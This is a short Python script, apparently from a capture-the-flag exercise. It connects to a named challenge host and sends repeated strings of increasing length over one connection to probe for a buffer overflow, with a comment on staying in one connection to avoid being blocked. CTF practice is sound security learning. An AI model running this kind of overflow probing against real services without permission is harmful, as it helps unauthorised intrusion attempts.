# trying to hit buffer overflow in one connection - each connection enable mulitple tries..if we try to do it on new connection each time we get blocked
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = "F01-target.allyourbases.co"
port =  8031
s.connect((host, port))
data = s.recv(1024)
print('Received', repr(data))
for i in range(1,22):              
    push_bytes = b"aaaaaaaaaa" * i
    push_bytes += b"\x0a"
    print("Pushed char: ",push_bytes)

    s.sendall(push_bytes)
    data = s.recv(1024)
    print('Received', repr(data))

s.close()
